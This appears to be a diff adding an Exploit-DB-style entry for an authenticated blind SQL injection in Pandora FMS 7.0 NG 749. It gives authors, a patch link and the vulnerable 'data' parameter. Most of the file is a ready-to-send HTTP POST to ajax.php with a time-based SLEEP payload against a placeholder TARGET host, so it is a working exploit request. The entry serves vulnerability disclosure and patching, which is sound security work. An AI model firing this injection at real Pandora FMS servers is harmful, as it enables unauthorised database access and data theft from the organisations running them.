@@ -1,0 +1,32 @@
+# Exploit Title: Pandora FMS 7.0 NG 749 - 'CG Items' SQL Injection (Authenticated)
+# Date: 11-14-2020
+# Exploit Author: Matthew Aberegg, Alex Prieto
+# Vendor Homepage: https://pandorafms.com/
+# Patch Link: https://github.com/pandorafms/pandorafms/commit/1258a1a63535f60924fb69b1f7812c678570cc8e
+# Software Link: https://pandorafms.com/community/get-started/
+# Version: Pandora FMS 7.0 NG 749
+# Tested on: Ubuntu 18.04
+
+
+# Vulnerability Details
+# Description : A blind SQL injection vulnerability exists in the "CG Items" functionality of Pandora FMS.  
+# Vulnerable Parameter : data
+
+
+# POC
+
+POST /pandora_console/ajax.php?data=(SELECT+1+FROM+(SELECT(SLEEP(5)))A) HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 23
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/pandora_console/index.php?sec=eventos&sec2=operation/events/events
+Cookie: PHPSESSID=i5uv0ugb4bdu9avagk38vcdok3
+
+page=general%2Fcg_items
